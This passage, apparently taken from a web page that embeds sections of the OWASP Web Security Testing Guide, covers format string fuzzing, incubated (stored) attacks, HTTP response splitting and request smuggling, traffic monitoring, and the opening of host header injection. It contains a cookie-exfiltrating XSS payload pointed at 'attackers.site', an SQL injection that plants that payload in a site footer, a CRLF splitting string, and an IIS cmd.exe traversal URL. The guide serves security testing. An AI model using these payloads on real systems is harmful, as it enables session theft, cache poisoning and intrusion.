                
                <p><code class="language-plaintext highlighter-rouge">wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_host/userinfo?username=FUZZ</code></p>
                
                <p>In the above call, the <code class="language-plaintext highlighter-rouge">urlencode</code> argument enables the approprate escaping for the strings and <code class="language-plaintext highlighter-rouge">FUZZ</code> (with the capital letters) tells the tool where to introduce the inputs.</p>
                
                <p>An example output is as follows</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ID           Response   Lines    Word     Chars       Payload
                ===================================================================
                
                000000002:   500        0 L      5 W      142 Ch      "%25s%25s%25s%25n"
                000000003:   500        0 L      5 W      137 Ch      "%25p%25p%25p%25p%25p"
                000000004:   200        0 L      1 W      48 Ch       "%7Bevent.__init__.__globals__%5BCONFIG%5D%5BSECRET_KEY%5D%7D"
                000000001:   200        0 L      1 W      5 Ch        "alice"
                </code></pre></div></div>
                
                <p>The above result validates the application’s weakness to the injection of C-like conversion specifiers <code class="language-plaintext highlighter-rouge">%s</code> and <code class="language-plaintext highlighter-rouge">%p</code>.</p>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv14Modal" tabindex="-1" role="dialog" aria-labelledby="inpv14ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv14ModalLabel">WSTG-INPV-14 - Testing for Incubated Vulnerability</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Also often referred to as persistent attacks, incubated testing is a complex testing method that needs more than one data validation vulnerability to work. Incubated vulnerabilities are typically used to conduct “watering hole” attacks against users of legitimate web applications.</p>
                
                <p>Incubated vulnerabilities have the following characteristics:</p>
                
                <ul>
                  <li>The attack vector needs to be persisted in the first place, it needs to be stored in the persistence layer, and this would only occur if weak data validation was present or the data arrived into the system via another channel such as an admin console or directly via a backend batch process.</li>
                  <li>Secondly, once the attack vector was “recalled” the vector would need to be executed successfully. For example, an incubated XSS attack would require weak output validation so the script would be delivered to the client in its executable form.</li>
                </ul>
                
                <p>Exploitation of some vulnerabilities, or even functional features of a web application, will allow an attacker to plant a piece of data that will later be retrieved by an unsuspecting user or other component of the system, exploiting some vulnerability there.</p>
                
                <p>In a penetration test, <code class="language-plaintext highlighter-rouge">incubated attacks</code> can be used to assess the criticality of certain bugs, using the particular security issue found to build a client-side based attack that usually will be used to target a large number of victims at the same time (i.e. all users browsing the site).</p>
                
                <p>This type of asynchronous attack covers a great spectrum of attack vectors, among them the following:</p>
                
                <ul>
                  <li>File upload components in a web application, allowing the attacker to upload corrupted media files (JPEG images exploiting <code class="language-plaintext highlighter-rouge">CVE-2004-0200</code>, PNG images exploiting <code class="language-plaintext highlighter-rouge">CVE-2004-0597</code>, executable files, site pages with active component, etc.)</li>
                  <li>Cross-site scripting issues in public forums posts (see <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">Testing for Stored Cross Site Scripting</a> for additional details). An attacker could potentially store malicious scripts or code in a repository in the backend of the web-application (e.g., a database) so that this script/code gets executed by one of the users (end users, administrators, etc). The archetypical incubated attack is exemplified by using a cross-site scripting vulnerability in a user forum, bulletin board, or blog in order to inject some JavaScript code at the vulnerable page, and will be eventually rendered and executed at the site user’s browser –using the trust level of the original (vulnerable) site at the user’s browser.</li>
                  <li>SQL/XPATH Injection allowing the attacker to upload content to a database, which will be later retrieved as part of the active content in a web page. For example, if the attacker can post arbitrary JavaScript in a bulletin board so that it gets executed by users, then he might take control of their browsers (e.g., <a href="http://sourceforge.net/projects/xss-proxy">XSS-proxy</a>).</li>
                  <li>Misconfigured servers allowing installation of Java packages or similar web site components (i.e. Tomcat, or web hosting consoles such as Plesk, CPanel, Helm, etc.)</li>
                </ul>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify injections that are stored and require a recall step to the stored injection.</li>
                  <li>Understand how a recall step could occur.</li>
                  <li>Set listeners or activate the recall step if possible.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="black-box-testing">Black-Box Testing</h3>
                
                <h4 id="file-upload-example">File Upload Example</h4>
                
                <p>Verify the content type allowed to upload to the web application and the resultant URL for the uploaded file. Upload a file that will exploit a component in the local user workstation when viewed or downloaded by the user. Send your victim an email or other kind of alert in order to lead him/her to browse the page. The expected result is the exploit will be triggered when the user browses the resultant page or downloads and executes the file from the trusted site.</p>
                
                <h4 id="xss-example-on-a-bulletin-board">XSS Example on a Bulletin Board</h4>
                
                <ol>
                  <li>Introduce JavaScript code as the value for the vulnerable field, for instance <code class="language-plaintext highlighter-rouge">&lt;script&gt;document.write('&lt;img&nbsp;src="http://attackers.site/cv.jpg?'+document.cookie+'"&gt;')&lt;/script&gt;</code></li>
                  <li>Direct users to browse the vulnerable page or wait for the users to browse it. Have a “listener” at <code class="language-plaintext highlighter-rouge">attackers.site</code> host listening for all incoming connections.</li>
                  <li>When users browse the vulnerable page, a request containing their cookie (<code class="language-plaintext highlighter-rouge">document.cookie</code> is included as part of the requested URL) will be sent to the <code class="language-plaintext highlighter-rouge">attackers.site</code> host, such as: <code class="language-plaintext highlighter-rouge">GET&nbsp;/cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE;&nbsp;HTTP/1.1</code></li>
                  <li>Use cookies obtained to impersonate users at the vulnerable site.</li>
                </ol>
                
                <h4 id="sql-injection-example">SQL Injection Example</h4>
                
                <p>Usually, this set of examples leverages XSS attacks by exploiting a SQL-injection vulnerability. The first thing to test is whether the target site has a SQL injection vulnerability. This is described in <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">Testing for SQL Injection</a>. For each SQL-injection vulnerability, there is an underlying set of constraints describing the kind of queries that the attacker/pen-tester is allowed to do.</p>
                
                <p>The tester then has to match the XSS attacks he has devised with the entries that he is allowed to insert.</p>
                
                <p>In a similar fashion as in the previous XSS example, use a web page field vulnerable to SQL injection issues to change a value in the database that would be used by the application as input to be shown at the site without proper filtering (this would be a combination of an SQL injection and a XSS issue). For instance, let’s suppose there is a <code class="language-plaintext highlighter-rouge">footer</code> table at the database with all footers for the web site pages, including a <code class="language-plaintext highlighter-rouge">notice</code> field with the legal notice that appears at the bottom of each web page. You could use the following query to inject JavaScript code to the <code class="language-plaintext highlighter-rouge">notice</code> field at the <code class="language-plaintext highlighter-rouge">footer</code> table in the database.</p>
                
                <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span><span class="err">&nbsp;</span><span class="n">field1</span><span class="p">,</span><span class="err">&nbsp;</span><span class="n">field2</span><span class="p">,</span><span class="err">&nbsp;</span><span class="n">field3</span>
                <span class="k">FROM</span><span class="err">&nbsp;</span><span class="n">table_x</span>
                <span class="k">WHERE</span><span class="err">&nbsp;</span><span class="n">field2</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="s1">'x'</span><span class="p">;</span>
                <span class="err">&nbsp;&nbsp;&nbsp;</span><span class="k">UPDATE</span><span class="err">&nbsp;</span><span class="n">footer</span>
                <span class="err">&nbsp;&nbsp;&nbsp;</span><span class="k">SET</span><span class="err">&nbsp;</span><span class="n">notice</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="s1">'Copyright&nbsp;1999-2030%20
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&gt;document.write(</span><span class="se">\'</span><span class="s1">&lt;img&nbsp;src="http://attackers.site/cv.jpg?</span><span class="se">\'</span><span class="s1">+document.cookie+</span><span class="se">\'</span><span class="s1">"&gt;</span><span class="se">\'</span><span class="s1">)&lt;/script&gt;'</span>
                <span class="err">&nbsp;&nbsp;&nbsp;</span><span class="k">WHERE</span><span class="err">&nbsp;</span><span class="n">notice</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="s1">'Copyright&nbsp;1999-2030'</span><span class="p">;</span>
                </code></pre></div></div>
                
                <p>Now, each user browsing the site will silently send their cookies to the <code class="language-plaintext highlighter-rouge">attackers.site</code>.</p>
                
                <h4 id="misconfigured-server">Misconfigured Server</h4>
                
                <p>Some web servers present an administration interface that may allow an attacker to upload active components of her choice to the site. This could be the case with an Apache Tomcat server that doesn’t enforce strong credentials to access its Web Application Manager (or if the pen testers have been able to obtain valid credentials for the administration module by other means).</p>
                
                <p>In this case, a WAR file can be uploaded and a new web application deployed at the site, which will not only allow the pen tester to execute code of her choice locally at the server, but also to plant an application at the trusted site, which the site regular users can then access (most probably with a higher degree of trust than when accessing a different site).</p>
                
                <p>As should also be obvious, the ability to change web page contents at the server, via any vulnerabilities that may be exploitable at the host which will give the attacker webroot write permissions, will also be useful towards planting such an incubated attack on the web server pages (actually, this is a known infection-spread method for some web server worms).</p>
                
                <h3 id="gray-box-testing">Gray-Box Testing</h3>
                
                <p>Gray-box or white-box testing techniques will be the same as previously discussed.</p>
                
                <ul>
                  <li>Examining input validation is key in mitigating against this vulnerability. If other systems in the enterprise use the same persistence layer they may have weak input validation and the data may be persisted via a <code class="language-plaintext highlighter-rouge">back door</code>.</li>
                  <li>To combat the <code class="language-plaintext highlighter-rouge">back door</code> issue for client-side attacks, output validation must also be employed so tainted data shall be encoded prior to displaying to the client, and hence not execute.</li>
                </ul>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://sourceforge.net/projects/xss-proxy">XSS-proxy</a></li>
                  <li><a href="https://www.zaproxy.org/">OWASP Zed Attack Proxy (ZAP)</a></li>
                  <li><a href="https://portswigger.net/burp">Burp Suite</a></li>
                  <li><a href="https://www.metasploit.com/">Metasploit</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <p>Most of the references from the Cross-site scripting section are valid. As explained above, incubated attacks are executed when combining exploits such as XSS or SQL-injection attacks.</p>
                
                <h3 id="advisories">Advisories</h3>
                
                <ul>
                  <li><a href="https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186">CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests</a></li>
                  <li><a href="https://cxsecurity.com/issue/WLB-2006080004">Blackboard Academic Suite 6.2.23 +/-: Persistent cross-site scripting vulnerability</a></li>
                </ul>
                
                <h3 id="whitepapers">Whitepapers</h3>
                
                <ul>
                  <li><a href="http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml">Web Application Security Consortium “Threat Classification, Cross-site scripting”</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv15Modal" tabindex="-1" role="dialog" aria-labelledby="inpv15ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv15ModalLabel">WSTG-INPV-15 - Testing for HTTP Splitting Smuggling</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>This section illustrates examples of attacks that leverage specific features of the HTTP protocol, either by exploiting weaknesses of the web application or peculiarities in the way different agents interpret HTTP messages.
                This section will analyze two different attacks that target specific HTTP headers:</p>
                
                <ul>
                  <li>HTTP splitting</li>
                  <li>HTTP smuggling</li>
                </ul>
                
                <p>The first attack exploits a lack of input sanitization which allows an intruder to insert CR and LF characters into the headers of the application response and to ‘split’ that answer into two different HTTP messages. The goal of the attack can vary from a cache poisoning to cross site scripting.</p>
                
                <p>In the second attack, the attacker exploits the fact that some specially crafted HTTP messages can be parsed and interpreted in different ways depending on the agent that receives them. HTTP smuggling requires some level of knowledge about the different agents that are handling the HTTP messages (web server, proxy, firewall) and therefore will be included only in the gray-box testing section.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.</li>
                  <li>Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="black-box-testing">Black-Box Testing</h3>
                
                <h4 id="http-splitting">HTTP Splitting</h4>
                
                <p>Some web applications use part of the user input to generate the values of some headers of their responses. The most straightforward example is provided by redirections in which the target URL depends on some user-submitted value. Let’s say for instance that the user is asked to choose whether they prefer a standard or advanced web interface. The choice will be passed as a parameter that will be used in the response header to trigger the redirection to the corresponding page.</p>
                
                <p>More specifically, if the parameter ‘interface’ has the value ‘advanced’, the application will answer with the following:</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
                <span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 03 Dec 2005 16:22:19 GMT</span>
                <span class="na">Location</span><span class="p">:</span> <span class="s">http://victim.com/main.jsp?interface=advanced</span>
                <span class="s">&lt;snip&gt;</span>
                </code></pre></div></div>
                
                <p>When receiving this message, the browser will bring the user to the page indicated in the Location header. However, if the application does not filter the user input, it will be possible to insert in the ‘interface’ parameter the sequence %0d%0a, which represents the CRLF sequence that is used to separate different lines. At this point, testers will be able to trigger a response that will be interpreted as two different responses by anybody who happens to parse it, for instance a web cache sitting between us and the application. This can be leveraged by an attacker to poison this web cache so that it will provide false content in all subsequent requests.</p>
                
                <p>Let’s say that in the previous example the tester passes the following data as the interface parameter:</p>
                
                <p><code class="language-plaintext highlighter-rouge">advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a&lt;html&gt;Sorry,%20System%20Down&lt;/html&gt;</code></p>
                
                <p>The resulting answer from the vulnerable application will therefore be the following:</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Moved Temporarily</span>
                <span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 03 Dec 2005 16:22:19 GMT</span>
                <span class="na">Location</span><span class="p">:</span> <span class="s">http://victim.com/main.jsp?interface=advanced</span>
                <span class="na">Content-Length</span><span class="p">:</span> <span class="s">0</span>
                
                HTTP/1.1 200 OK
                Content-Type: text/html
                Content-Length: 35
                
                &lt;html&gt;Sorry,%20System%20Down&lt;/html&gt;
                &lt;other data&gt;
                </code></pre></div></div>
                
                <p>The web cache will see two different responses, so if the attacker sends, immediately after the first request, a second one asking for <code class="language-plaintext highlighter-rouge">/index.html</code>, the web cache will match this request with the second response and cache its content, so that all subsequent requests directed to <code class="language-plaintext highlighter-rouge">victim.com/index.html</code> passing through that web cache will receive the “system down” message. In this way, an attacker would be able to effectively deface the site for all users using that web cache (the whole Internet, if the web cache is a reverse proxy for the web application).</p>
                
                <p>Alternatively, the attacker could pass to those users a JavaScript snippet that mounts a cross site scripting attack, e.g., to steal the cookies. Note that while the vulnerability is in the application, the target here is its users. Therefore, in order to look for this vulnerability, the tester needs to identify all user controlled input that influences one or more headers in the response, and check whether they can successfully inject a CR+LF sequence in it.</p>
                
                <p>The headers that are the most likely candidates for this attack are:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">Location</code></li>
                  <li><code class="language-plaintext highlighter-rouge">Set-Cookie</code></li>
                </ul>
                
                <p>It must be noted that a successful exploitation of this vulnerability in a real world scenario can be quite complex, as several factors must be taken into account:</p>
                
                <ol>
                  <li>The pen-tester must properly set the headers in the fake response for it to be successfully cached (e.g., a Last-Modified header with a date set in the future). They might also have to destroy previously cached versions of the target pagers, by issuing a preliminary request with <code class="language-plaintext highlighter-rouge">Pragma: no-cache</code> in the request headers</li>
                  <li>The application, while not filtering the CR+LF sequence, might filter other characters that are needed for a successful attack (e.g., <code class="language-plaintext highlighter-rouge">&lt;</code> and <code class="language-plaintext highlighter-rouge">&gt;</code>). In this case, the tester can try to use other encodings (e.g., UTF-7)</li>
                  <li>Some targets (e.g., ASP) will URL-encode the path part of the Location header (e.g., <code class="language-plaintext highlighter-rouge">www.victim.com/redirect.asp</code>), making a CRLF sequence useless. However, they fail to encode the query section (e.g., ?interface=advanced), meaning that a leading question mark is enough to bypass this filtering</li>
                </ol>
                
                <p>For a more detailed discussion about this attack and other information about possible scenarios and applications, check the papers referenced at the bottom of this section.</p>
                
                <h3 id="gray-box-testing">Gray-Box Testing</h3>
                
                <h4 id="http-splitting-1">HTTP Splitting</h4>
                
                <p>A successful exploitation of HTTP Splitting is greatly helped by knowing some details of the web application and of the attack target. For instance, different targets can use different methods to decide when the first HTTP message ends and when the second starts. Some will use the message boundaries, as in the previous example. Other targets will assume that different messages will be carried by different packets. Others will allocate for each message a number of chunks of predetermined length: in this case, the second message will have to start exactly at the beginning of a chunk and this will require the tester to use padding between the two messages. This might cause some trouble when the vulnerable parameter is to be sent in the URL, as a very long URL is likely to be truncated or filtered. A gray-box scenario can help the attacker to find a workaround: several application servers, for instance, will allow the request to be sent using POST instead of GET.</p>
                
                <h4 id="http-smuggling">HTTP Smuggling</h4>
                
                <p>As mentioned in the introduction, HTTP Smuggling leverages the different ways that a particularly crafted HTTP message can be parsed and interpreted by different agents (browsers, web caches, application firewalls). This relatively new kind of attack was first discovered by Chaim Linhart, Amit Klein, Ronen Heled and Steve Orrin in 2005. There are several possible applications and we will analyze one of the most spectacular: the bypass of an application firewall. Refer to the original whitepaper (linked at the bottom of this page) for more detailed information and other scenarios.</p>
                
                <h5 id="application-firewall-bypass">Application Firewall Bypass</h5>
                
                <p>There are several products that enable a system administration to detect and block a hostile web request depending on some known malicious pattern that is embedded in the request. For example, consider the infamous, old <a href="https://www.securityfocus.com/bid/1806">Unicode directory traversal attack against IIS server</a>, in which an attacker could break out the www root by issuing a request like:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://target/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+&lt;command_to_execute&gt;</code></p>
                
                <p>Of course, it is quite easy to spot and filter this attack by the presence of strings like “..” and “cmd.exe” in the URL. However, IIS 5.0 is quite picky about POST requests whose body is up to 48K bytes and truncates all content that is beyond this limit when the Content-Type header is different from application/x-www-form-urlencoded. The pen-tester can leverage this by creating a very large request, structured as follows:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /target.asp HTTP/1.1        <span class="nt">&lt;--</span> <span class="na">Request</span> <span class="na">#1</span>
                <span class="na">Host:</span> <span class="na">target</span>
                <span class="na">Connection:</span> <span class="na">Keep-Alive</span>
                <span class="na">Content-Length:</span> <span class="err">49225</span>
                <span class="err">&lt;</span><span class="na">CRLF</span><span class="nt">&gt;</span>
                <span class="nt">&lt;</span><span class="err">49152</span> <span class="na">bytes</span> <span class="na">of</span> <span class="na">garbage</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /target.asp HTTP/1.0        <span class="nt">&lt;--</span> <span class="na">Request</span> <span class="na">#2</span>
                <span class="na">Connection:</span> <span class="na">Keep-Alive</span>
                <span class="na">Content-Length:</span> <span class="err">33</span>
                <span class="err">&lt;</span><span class="na">CRLF</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /target.asp HTTP/1.0        <span class="nt">&lt;--</span> <span class="na">Request</span> <span class="na">#3</span>
                <span class="na">xxxx:</span> <span class="na">POST</span> <span class="err">/</span><span class="na">scripts</span><span class="err">/..%</span><span class="na">c1</span><span class="err">%1</span><span class="na">c..</span><span class="err">/</span><span class="na">winnt</span><span class="err">/</span><span class="na">system32</span><span class="err">/</span><span class="na">cmd.exe</span><span class="err">?/</span><span class="na">c</span><span class="err">+</span><span class="na">dir</span> <span class="na">HTTP</span><span class="err">/1.0</span>   <span class="err">&lt;</span><span class="na">--</span> <span class="na">Request</span> <span class="na">#4</span>
                <span class="na">Connection:</span> <span class="na">Keep-Alive</span>
                <span class="err">&lt;</span><span class="na">CRLF</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <p>What happens here is that the <code class="language-plaintext highlighter-rouge">Request #1</code> is made of 49223 bytes, which includes also the lines of <code class="language-plaintext highlighter-rouge">Request #2</code>. Therefore, a firewall (or any other agent beside IIS 5.0) will see Request #1, will fail to see <code class="language-plaintext highlighter-rouge">Request #2</code> (its data will be just part of #1), will see <code class="language-plaintext highlighter-rouge">Request #3</code> and miss <code class="language-plaintext highlighter-rouge">Request #4</code> (because the POST will be just part of the fake header xxxx).</p>
                
                <p>Now, what happens to IIS 5.0 ? It will stop parsing <code class="language-plaintext highlighter-rouge">Request #1</code> right after the 49152 bytes of garbage (as it will have reached the 48K=49152 bytes limit) and will therefore parse <code class="language-plaintext highlighter-rouge">Request #2</code> as a new, separate request. <code class="language-plaintext highlighter-rouge">Request #2</code> claims that its content is 33 bytes, which includes everything until “xxxx: “, making IIS miss <code class="language-plaintext highlighter-rouge">Request #3</code> (interpreted as part of <code class="language-plaintext highlighter-rouge">Request #2</code>) but spot <code class="language-plaintext highlighter-rouge">Request #4</code>, as its POST starts right after the 33rd byte or <code class="language-plaintext highlighter-rouge">Request #2</code>. It is a bit complicated, but the point is that the attack URL will not be detected by the firewall (it will be interpreted as the body of a previous request) but will be correctly parsed (and executed) by IIS.</p>
                
                <p>While in the aforementioned case the technique exploits a bug of a web server, there are other scenarios in which we can leverage the different ways that different HTTP-enabled devices parse messages that are not 1005 RFC compliant. For instance, the HTTP protocol allows only one Content-Length header, but does not specify how to handle a message that has two instances of this header. Some implementations will use the first one while others will prefer the second, cleaning the way for HTTP Smuggling attacks. Another example is the use of the Content-Length header in a GET message.</p>
                
                <p>Note that HTTP Smuggling does <code class="language-plaintext highlighter-rouge">*not*</code> exploit any vulnerability in the target web application. Therefore, it might be somewhat tricky, in a pen-test engagement, to convince the client that a countermeasure should be looked for anyway.</p>
                
                <h2 id="references">References</h2>
                
                <h3 id="whitepapers">Whitepapers</h3>
                
                <ul>
                  <li><a href="https://packetstormsecurity.com/files/32815/Divide-and-Conquer-HTTP-Response-Splitting-Whitepaper.html">Amit Klein, “Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics”</a></li>
                  <li><a href="https://www.slideserve.com/alicia/http-message-splitting-smuggling-and-other-animals-powerpoint-ppt-presentation">Amit Klein: “HTTP Message Splitting, Smuggling and Other Animals”</a></li>
                  <li><a href="https://www.securityfocus.com/archive/1/411418">Amit Klein: “HTTP Request Smuggling - ERRATA (the IIS 48K buffer phenomenon)”</a></li>
                  <li><a href="https://www.securityfocus.com/archive/1/425593">Amit Klein: “HTTP Response Smuggling”</a></li>
                  <li><a href="https://www.cgisecurity.com/lib/http-request-smuggling.pdf">Chaim Linhart, Amit Klein, Ronen Heled, Steve Orrin: “HTTP Request Smuggling”</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv16Modal" tabindex="-1" role="dialog" aria-labelledby="inpv16ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv16ModalLabel">WSTG-INPV-16 - Testing for HTTP Incoming Requests</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>This section describes how to monitor all incoming/outgoing HTTP requests on both client-side or server-side. The purpose of this testing is to verify if there is unnecessary or suspicious HTTP request sending in the background.</p>
                
                <p>Most of Web security testing tools (i.e. AppScan, BurpSuite, ZAP) act as HTTP Proxy. This will require changes of proxy on client-side application or browser. The testing techniques listed below is primary focused on how we can monitor HTTP requests without changes of client-side which will be more close to production usage scenario.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.</li>
                  <li>Monitor HTTP traffic without changes of end user Browser proxy or client-side application.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="reverse-proxy">Reverse Proxy</h3>
                
                <p>There is situation that we would like to monitor all HTTP incoming requests on web server but we can’t change configuration on the browser or application client-side. In this scenario, we can setup a reverse proxy on web server end to monitor all incoming/outgoing requests on web server.</p>
                
                <p>For windows platform, Fiddler is recommended. It provides not only monitor but can also edit/reply the HTTP requests. Refer to <a href="http://docs.telerik.com/fiddler/Configure-Fiddler/Tasks/UseFiddlerAsReverseProxy">this reference for how to configure Fiddler as reverse Proxy</a></p>
                
                <p>For Linux platform, Charles Web Debugging Proxy may be used.</p>
                
                <p>The testing steps:</p>
                
                <ol>
                  <li>Install Fiddler or Charles on Web Server</li>
                  <li>Configure the Fiddler or Charles as Reverse Proxy</li>
                  <li>Capture the HTTP traffic</li>
                  <li>Inspect HTTP traffic</li>
                  <li>Modify HTTP requests and replay the modified requests for testing</li>
                </ol>
                
                <h3 id="port-forwarding">Port Forwarding</h3>
                
                <p>Port forwarding is another way to allow us intercept HTTP requests without changes of client-side. You can also use Charles as a SOCKS proxy to act as port forwarding or uses of Port Forwarding tools. It will allow us to forward all coming client-side captured traffic to web server port.</p>
                
                <p>The testing flow will be:</p>
                
                <ol>
                  <li>Install the Charles or port forwarding on another machine or web Server</li>
                  <li>Configure the Charles as Socks proxy as port forwarding.</li>
                </ol>
                
                <h3 id="tcp-level-network-traffic-capture">TCP-level Network Traffic Capture</h3>
                
                <p>This technique monitor all the network traffic at TCP-level. TCPDump or WireShark tools can be used. However, these tools don’t allow us edit the captured traffic and send modified HTTP requests for testing. To replay the captured traffic (PCAP) packets, Ostinato can be used.</p>
                
                <p>The testing steps will be:</p>
                
                <ol>
                  <li>Activate TCPDump or WireShark on Web Server to capture network traffic</li>
                  <li>Monitor the captured files (PCAP)</li>
                  <li>Edit PCAP files by Ostinato tool based on need</li>
                  <li>Reply the HTTP requests</li>
                </ol>
                
                <p>Fiddler or Charles are recommended since these tools can capture HTTP traffic and also easily edit/reply the modified HTTP requests. In addition, if the web traffic is HTTPS, the wireshark will need to import the web server private key to inspect the HTTPS message body. Otherwise, the HTTPS message body of the captured traffic will all be encrypted.</p>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://www.telerik.com/fiddler/">Fiddler</a></li>
                  <li><a href="http://grinder.sourceforge.net/g3/tcpproxy.html">TCPProxy</a></li>
                  <li><a href="https://www.charlesproxy.com/">Charles Web Debugging Proxy</a></li>
                  <li><a href="https://www.wireshark.org/">WireShark</a></li>
                  <li><a href="https://sourceforge.net/projects/powereditpcap/">PowerEdit-Pcap</a></li>
                  <li><a href="https://github.com/BlackArch/pcapteller">pcapteller</a></li>
                  <li><a href="https://github.com/sparrowt/replayproxy">replayproxy</a></li>
                  <li><a href="https://ostinato.org/">Ostinato</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <ul>
                  <li><a href="https://www.charlesproxy.com/">Charles Web Debugging Proxy</a></li>
                  <li><a href="https://www.telerik.com/fiddler/">Fiddler</a></li>
                  <li><a href="https://www.tcpdump.org/">TCPDUMP</a></li>
                  <li><a href="https://ostinato.org/">Ostinato</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv17Modal" tabindex="-1" role="dialog" aria-labelledby="inpv17ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv17ModalLabel">WSTG-INPV-17 - Testing for Host Header Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>A web server commonly hosts several web applications on the same IP address, referring to each application via the virtual host. In an incoming HTTP request, web servers often dispatch the request to the target virtual host based on the value supplied in the Host header. Without proper validation of the header value, the attacker can supply invalid input to cause the web server to:</p>
                
                <ul>
                  <li>dispatch requests to the first virtual host on the list</li>
